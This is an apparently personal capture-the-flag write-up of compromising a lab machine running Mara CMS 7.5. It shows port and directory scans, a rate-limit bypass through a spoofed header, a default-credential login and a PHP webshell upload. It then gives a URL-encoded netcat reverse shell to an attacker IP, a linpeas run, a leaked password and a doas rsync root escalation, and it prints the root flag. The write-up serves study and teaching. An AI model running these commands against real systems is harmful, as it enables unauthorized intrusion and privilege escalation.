Quick port scanning.

```bash
nmap -p- --min-rate=5000 10.10.151.22 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 13:27 EEST
Nmap scan report for 10.10.151.22
Host is up (0.22s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8085/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80,8085 -sC -sV 10.10.151.22
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 13:27 EEST
Nmap scan report for 10.10.151.22
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
8085/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Spinner
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds
```

So ssh and 2 websites. One of them is running a number guessing game that is gong to reveal something. I decided to create a python script that goes through all the numbers

The script works but is randomly stopped due to exceeding rate limits. I checked if there was a way to bypass this since slowing down the script etc would be impossible since it would take days to bruteforce a number that large.


```bash
HTTP/1.1 429 TOO MANY REQUESTS
Server: gunicorn/20.0.4
Date: Sun, 31 Aug 2025 10:33:14 GMT
Connection: close
Content-Type: application/json
Content-Length: 33
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1756636433
Retry-After: 38

{"error":"rate limit execeeded"}
```
https://book.hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html

I created a python script which was way too slow and I just decided to use FUZZ since its pretty fast.

I just had to change the header X-remote-Addrs to localhost and it allowed us to run through all the numbers without exceeding any limits.

At first i filtered it with response.text but that didn't give anyresults so i decided to filter it with response size since if its going to reveal a path then the size of it is going to be different.

It worked and we were given the numbers and it was 10921 and the path was /YouGotTh3P@th


It reveals a MARA CMS page. 

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://10.10.151.22/YouGotTh3P@th/ -t 150 -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.151.22/YouGotTh3P@th/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
Progress: 2622 / 81876 (3.20%)[ERROR]error on word !ut.txt: timeout occurred during the request
/about.php            (Status: 200) [Size: 8727]
/blog                 (Status: 301) [Size: 325] [--> http://10.10.151.22/YouGotTh3P@th/blog/]
/changes.txt          (Status: 200) [Size: 627]
/codebase             (Status: 301) [Size: 329] [--> http://10.10.151.22/YouGotTh3P@th/codebase/]
/contact.php          (Status: 200) [Size: 7694]
/css                  (Status: 301) [Size: 324] [--> http://10.10.151.22/YouGotTh3P@th/css/]
/gallery.php          (Status: 500) [Size: 0]

```

We can see the version of the CMS in the changes.txt

```bash
Mara 7.5:

Race hazard causing partial upload of media fixed. (Uploader briefly signalling 'idle' between uploads could be taken as completion on slow processor. Flag changed to 'alldone' to avoid ambiguity.) 

CK updated to 4.11.1 (4.9 also provided in case of any compatibility issues with existing sites - Just rename folders.) 

Media handing - .svg graphics file capability added. 

Added inclusion of js and css from the page head. 
 This can be turned off in siteini.php if necessary, it's the phjscss item in [site] 
 -If it's not needed, turning off will save a little on page load time and processor usage.
```

https://nvd.nist.gov/vuln/detail/CVE-2020-25042

I found this exploit which is in MARA 7.5 but it needs credentials which I dont have yet. Im going to do some more enumerating.
There is also an XSS exploit on the contact.php site.

https://www.exploit-db.com/exploits/48780

Ok the site has default credentials on it. Maybe they didn't expect anyone to bruteforce 25000 numbers.


Once logged in we can upload a file from
http://10.10.151.22/YouGotTh3P@th/codebase/dir.php?type=filenew


We uploaded the exploit that allows us to run commands through arguments

```bash
http://10.10.151.22/YouGotTh3P@th/img/webshell.php?cmd=whoami

www-data
```

I URL encoded a shell and it was successful
```bash
http://10.10.151.22/YouGotTh3P@th/img/webshell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.6.25.159%204444%20%3E%2Ftmp%2Ff
```

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ cd /home
```

I decided to enumerate the machine with linpeas since i dont wanna do it manually. I just setup a http.server and downloaded the bash file into the /tmp folder and changed the permissions and ran the script.

```bash
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens 
ptrace protection is enabled (1)                                                                      

╔══════════╣ Doas Configuration
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas                
Doas binary found at: /usr/local/bin/doas                                                             
Doas binary has SUID bit set!
-rwsr-x--x 1 root root 38616 Dec  6  2020 /usr/local/bin/doas
-e 
Checking doas.conf files:
Found: /usr/local/bin/../etc/doas.conf
 permit nopass kiran as root cmd rsync
Found: /usr/local/etc/doas.conf
 permit nopass kiran as root cmd rsync


www-data@ubuntu-xenial:/var/backups$ cat .bak.passwd
cat .bak.passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
kiran:x:1002:1002:trythispasswordforuserkiran:/home/kiran:
```


We were basically allowed to use doas and only run rsync as root. 

We were able to go to https://gtfobins.github.io/gtfobins/rsync/

And just run the command of

```bash
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

```
And we rooted the machien

```bash
kiran@ubuntu-xenial:~$ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null     
< rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null                        
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
afbb1696a893f35984163021d03f6095
# 
```
Great machine. I didn't really like the beginning since it looked like a trash machine but it was pretty fun in the end. A different type of privesc. 


